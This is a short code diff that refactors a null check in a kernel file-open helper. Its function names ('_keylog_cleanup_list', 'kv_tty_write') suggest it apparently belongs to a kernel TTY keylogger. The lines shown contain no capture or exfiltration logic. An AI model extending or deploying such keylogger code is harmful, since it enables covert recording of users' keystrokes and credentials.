@@ -21,12 +21,10 @@ static void _keylog_cleanup_list(struct list_head *head) {
 }
 
 struct file *kv_tty_open(struct file **fp, const char *filename) {
-    if (filename != NULL) {
-		if (fp)
-			*fp = fs_kernel_open_file(filename);
-	}
+	if (NULL != filename && NULL != fp)
+		*fp = fs_kernel_open_file(filename);
 
-    return *fp;
+	return *fp;
 }
 
 void kv_tty_write(struct file *fp, uid_t uid, char *buf, ssize_t len) {
